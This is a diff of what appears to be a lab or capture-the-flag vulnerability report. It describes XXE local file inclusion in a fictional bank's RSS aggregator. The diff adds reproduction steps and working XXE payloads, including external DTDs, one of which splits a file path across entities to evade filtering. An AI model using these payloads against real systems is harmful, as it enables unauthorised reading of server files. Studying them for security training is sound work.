@@ -1,5 +1,7 @@
 # XML external entities vulnerability in 'feedifier.quoccabank.com' leading to local file inclusion
 
+## Severity : High
+
 ## Report summary:
 
 XXE vulnerability in the RSS aggregator functionality on  endpoints:
@@ -10,15 +12,22 @@ XXE vulnerability in the RSS aggregator functionality on  endpoints:
 
 leads to there being a local file inclusion vulnerability on all three of these end points.
 
-
-
-## Severity : High
-
 ## Steps to reproduce
 
 Host your own website to serve your own malicious RSS files.
 
-//todo show setup of apache server
+- **important note**
+  - host the pages with a .html extension
+
+Navigate to either v1, v2 or v3 versions for example "https://v1.feedifier.quoccabank.com"
+
+Paste in the address to your external website which contains the malicious XML document.
+
+![image-20210709172612058](./images/feed1.png)
+
+The output should look something like this:
+
+![image-20210709175224832](./images/feed2.png)
 
 ## Proof of concept 
 
@@ -27,7 +36,7 @@ Host your own website to serve your own malicious RSS files.
 ```html
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ <!ELEMENT title ANY >
-<!ENTITY xxe SYSTEM "file:///flag_f32d46b748d303eb137c3e0329e9ba0b" >]>
+<!ENTITY xxe SYSTEM "file://<file_path>" >]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog</title>
@@ -73,8 +82,26 @@ External dtd file
 
 ```html
 <!ENTITY % beg "<![CDATA[">
-<!ENTITY % payload SYSTEM "file:///flag_39b5940d05a43ac6b4958bed87041f15">
+<!ENTITY % payload SYSTEM "file://<insert file path>">
 <!ENTITY % end "]]>">
 <!ENTITY atak "%beg;%payload;%end;">
+```
+
+ 
+
+### v3.feedifier
+
+v3's exploit is basically identical to v2 with some changes in the dtd file
+
+```html
+<!ENTITY % beg "<![CDATA[">
+<!ENTITY % end "]]>">
+
+<!ENTITY % a "fi">
+<!ENTITY % b "le:///fla">
+<!ENTITY % c "g_d0642f00f99dbc509cf0551ddb81527d" >
+<!ENTITY % d "%a;%b;%c;">
+
+<!ENTITY % bundle "<!ENTITY atak '%beg;%d;%end;'>">
 ```
 
